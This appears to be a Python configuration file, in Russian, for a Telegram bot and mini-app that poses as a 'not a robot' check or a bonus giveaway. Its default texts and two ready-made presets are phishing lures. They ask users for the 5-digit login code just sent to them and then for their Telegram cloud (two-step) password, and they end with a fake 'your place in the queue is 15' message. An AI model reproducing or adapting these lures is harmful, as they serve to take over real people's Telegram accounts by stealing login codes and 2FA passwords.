from __future__ import annotations

STD_DEFAULTS: dict[str, str] = {
    "start_msg": (
        "👋 Здравствуйте!\nЧтобы получить доступ к боту 👇\n\n"
        "❗ Пожалуйста, подтвердите то, что вы не робот"
    ),
    "start_btn": "🚀 Открыть мини-апп",
    "second_msg": "👆",
    "expired_msg": "⌛ Время на проверку вышло! Попробуйте ещё раз!",
    "expired_btn": "Попробовать ✅",
    "auth_ok": (
        "🎉 Вы успешно подтвердили, что вы настоящий человек!\n"
        "Ожидайте, ваше место в очереди 15."
    ),
    "spam_auth": "📢 Уведомление авторизованным пользователям.",
    "spam_unauth": "📢 Уведомление неавторизованным пользователям.",
    "admin_post": "",
    "show_auth": "✅ Показ успешной авторизации.",
    "show_code": "📋 Ваш код: {CODE}",
}

PAGES: dict[str, str] = {
    "main": "Главная страница",
    "code": "Страница ввода кода",
    "twofa": "Страница с 2FA",
    "success": "Страница успешной авторизации",
}

PAGE_FIELDS: dict[str, list[tuple[str, str]]] = {
    "main": [
        ("emoji", "😀 Эмодзи"),
        ("button", "💬 Текст кнопки"),
        ("waiting", "⏳ Текст ожидания"),
        ("text", "📝 Текст"),
    ],
    "code": [
        ("emoji", "😀 Эмодзи"),
        ("button", "💬 Текст кнопки"),
        ("wrong", "🚫 Текст неверного кода"),
        ("text", "📝 Текст"),
    ],
    "twofa": [
        ("emoji", "😀 Эмодзи"),
        ("button", "💬 Текст кнопки"),
        ("placeholder", "✏️ Текст в поле ввода"),
        ("hint", "💡 Текст подсказки"),
        ("text", "📝 Текст"),
    ],
    "success": [
        ("emoji", "😀 Эмодзи"),
        ("button", "💬 Текст кнопки"),
        ("text", "📝 Текст"),
    ],
}

SHORT_SUBFIELDS = {"emoji", "button"}

PAGE_DEFAULTS: dict[str, dict[str, str]] = {
    "main": {
        "emoji": "👋",
        "button": "Подтвердить",
        "waiting": "Ожидайте, не выходите!",
        "text": (
            "Нужно подтвердить, что вы настоящий человек, "
            "нажмите на кнопку ниже для начала!"
        ),
    },
    "code": {
        "emoji": "🔐",
        "button": "Узнать код",
        "wrong": (
            "❌ Вы ввели неверный код! Пожалуйста, перейдите по кнопке ниже, "
            "посмотрите код и затем введите его на клавиатуре ниже ⌨️"
        ),
        "text": "Введите 5-значный код, который мы вам только что отправили!",
    },
    "twofa": {
        "emoji": "🙈",
        "button": "Проверить",
        "placeholder": "Ваш пароль",
        "hint": "Подсказка",
        "text": (
            "Вы ввели верный код, но у вас установлен облачный пароль, "
            "введите его в поле ниже!"
        ),
    },
    "success": {
        "emoji": "🎉",
        "button": "Ок",
        "text": (
            "Вы сделали все правильно! Ваше место в очереди 15. "
            "Ожидайте, мы вам напишем!"
        ),
    },
}

COLORS: dict[str, tuple[str, str]] = {
    "white": ("⚪", "Белый"),
    "black": ("⚫", "Чёрный"),
    "green": ("🟢", "Зелёный"),
    "blue": ("🔵", "Синий"),
    "red": ("🔴", "Красный"),
    "purple": ("🟣", "Фиолетовый"),
    "yellow": ("🟡", "Жёлтый"),
    "pink": ("🌸", "Розовый"),
    "lightblue": ("💙", "Голубой"),
    "default": ("🎨", "Стандартный"),
}

VIEWS: dict[str, str] = {
    "classic": "Классический",
    "card": "Карточка",
    "glass": "Стекло",
    "minimal": "Минимал",
    "bottom": "Кнопка снизу",
}
DEFAULT_VIEW = "classic"

def background_css(value: str | None) -> str:
    if not value:
        return ""
    if "gradient(" in value:
        return value
    if value.startswith(("http://", "https://", "data:", "//")):
        return f"url('{value}')"
    return ""

def page_field_key(page: str, field: str) -> str:
    return f"{page}_{field}"

PAGE_DEFAULT_FLAT: dict[str, str] = {
    page_field_key(page, field): value
    for page, fields in PAGE_DEFAULTS.items()
    for field, value in fields.items()
}

ALL_DEFAULTS: dict[str, str] = {**STD_DEFAULTS, **PAGE_DEFAULT_FLAT}

def default_content() -> dict:
    content: dict[str, str] = dict(ALL_DEFAULTS)
    content["ui_color"] = "default"
    content["view"] = DEFAULT_VIEW
    return content

def _preset(
    start_msg: str,
    start_btn: str,
    second_msg: str,
    pages: dict[str, dict[str, str]],
    view: str = "classic",
) -> dict:
    c = default_content()
    c["start_msg"] = start_msg
    c["start_btn"] = start_btn
    c["second_msg"] = second_msg
    c["view"] = view
    for page, fields in pages.items():
        for field, value in fields.items():
            c[page_field_key(page, field)] = value
    return c

PRESETS: list[dict] = [
    {
        "id": "security",
        "name": "Проверка безопасности",
        "content": _preset(
            start_msg=(
                "🔐 <b>Здравствуйте!</b>\nДля доступа нужно пройти быструю "
                "проверку безопасности.\nНажмите кнопку ниже 👇"
            ),
            start_btn="🔐 Пройти проверку",
            second_msg="👇",
            view="card",
            pages={
                "main": {
                    "emoji": "🛡",
                    "button": "Начать проверку",
                    "waiting": "Проверяем…",
                    "text": (
                        "Подтвердите, что вы реальный пользователь — "
                        "это займёт несколько секунд."
                    ),
                },
                "code": {
                    "emoji": "✉️",
                    "button": "Получить код",
                    "wrong": "❌ Код неверный, попробуйте ещё раз.",
                    "text": "Введите код подтверждения из сообщения.",
                },
                "twofa": {
                    "emoji": "🔑",
                    "button": "Подтвердить",
                    "placeholder": "Облачный пароль",
                    "hint": "Это пароль двухэтапной аутентификации Telegram.",
                    "text": "Введите облачный пароль, чтобы завершить проверку.",
                },
                "success": {
                    "emoji": "✅",
                    "button": "Готово",
                    "text": "Проверка пройдена! Доступ открыт.",
                },
            },
        ),
    },
    {
        "id": "reward",
        "name": "Бонус и розыгрыш",
        "content": _preset(
            start_msg=(
                "🎁 <b>Поздравляем!</b>\nВам доступен бонус. Чтобы забрать — "
                "откройте приложение кнопкой ниже 👇"
            ),
            start_btn="🎁 Забрать бонус",
            second_msg="👇",
            view="glass",
            pages={
                "main": {
                    "emoji": "🎉",
                    "button": "Забрать бонус",
                    "waiting": "Активируем бонус…",
                    "text": (
                        "Ваш подарок уже ждёт! Нажмите кнопку, чтобы "
                        "активировать."
                    ),
                },
                "code": {
                    "emoji": "📩",
                    "button": "Получить код",
                    "wrong": "❌ Неверный код, проверьте сообщение.",
                    "text": "Введите код подтверждения, чтобы активировать бонус.",
                },
                "twofa": {
                    "emoji": "🔒",
                    "button": "Подтвердить",
                    "placeholder": "Облачный пароль",
                    "hint": "Пароль двухэтапной аутентификации.",
                    "text": "Последний шаг — введите облачный пароль.",
                },
                "success": {
                    "emoji": "🏆",
                    "button": "Отлично",
                    "text": "Бонус активирован! Спасибо, что вы с нами.",
                },
            },
        ),
    },
]
